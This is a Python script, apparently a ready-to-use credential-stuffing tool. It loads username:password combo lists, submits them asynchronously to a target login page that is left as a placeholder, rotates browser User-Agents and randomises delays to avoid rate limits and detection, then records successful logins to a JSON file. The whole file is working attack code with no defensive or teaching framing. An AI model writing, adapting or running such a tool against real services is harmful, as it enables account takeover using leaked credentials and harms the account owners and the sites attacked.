# Credential stuffer async — rate-limit aware, rotating UA
# deps: aiohttp
import asyncio,aiohttp,json,random
from pathlib import Path

UA=[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/115.0",
]
TARGET     = "https://FILL_TARGET/login"       # FILL
POST_PARAMS = lambda u,p: {"username":u,"password":p}  # FILL si nécessaire
SUCCESS_SIG = "dashboard"
DELAY_MIN,DELAY_MAX = 1.5,4.0
CONCURRENCY = 3

async def try_login(session,user,pw,sem):
    async with sem:
        try:
            async with session.post(TARGET,data=POST_PARAMS(user,pw),
                headers={"User-Agent":random.choice(UA)},
                allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=10)) as r:
                body=await r.text()
                return {"user":user,"pass":pw,"status":r.status,
                        "success":SUCCESS_SIG.lower() in body.lower()}
        except Exception as e:
            return {"user":user,"pass":pw,"error":str(e),"success":False}
        finally:
            await asyncio.sleep(random.uniform(DELAY_MIN,DELAY_MAX))

async def run(combo_file,out_file):
    combos=[(l.split(":",1)[0].strip(),l.split(":",1)[1].strip())
            for l in Path(combo_file).read_text().splitlines() if ":" in l]
    print(f"[+] {len(combos)} combos")
    hits=[]; sem=asyncio.Semaphore(CONCURRENCY)
    async with aiohttp.ClientSession() as sess:
        for i,coro in enumerate(asyncio.as_completed(
            [try_login(sess,u,p,sem) for u,p in combos])):
            r=await coro
            if r.get("success"): print(f"[HIT] {r['user']}:{r['pass']}"); hits.append(r)
            else: print(f"[{i+1}/{len(combos)}] {r['user']} fail")
    Path(out_file).write_text(json.dumps(hits,indent=2))
    print(f"[+] {len(hits)} hits → {out_file}")

if __name__=="__main__":
    cf=input("Combos [combos.txt]: ") or "combos.txt"
    of=input("Output [output/hits.json]: ") or "output/hits.json"
    asyncio.run(run(cf,of))
    